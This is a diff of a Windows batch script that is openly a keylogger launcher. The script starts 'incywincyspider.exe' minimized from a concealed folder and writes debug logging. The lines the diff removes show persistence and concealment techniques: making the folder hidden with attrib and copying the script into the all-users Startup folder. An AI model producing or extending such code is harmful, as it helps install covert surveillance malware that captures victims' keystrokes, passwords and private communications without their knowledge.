@@ -1,12 +1,7 @@
 @echo off
 echo Starting script... >> %TEMP%\debug.log
 set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\incywincyspider.exe"
-set "STARTUP_PATH=%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp\incywincyspider_starter.cmd"
 echo KEYLOGGER_PATH: %KEYLOGGER_PATH% >> %TEMP%\debug.log
-echo STARTUP_PATH: %STARTUP_PATH% >> %TEMP%\debug.log
-mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul
-attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul
-copy "%~f0" "%STARTUP_PATH%" >nul
 if exist "%KEYLOGGER_PATH%" (
     echo File exists, attempting to run... >> %TEMP%\debug.log
     start /min "" "%KEYLOGGER_PATH%"
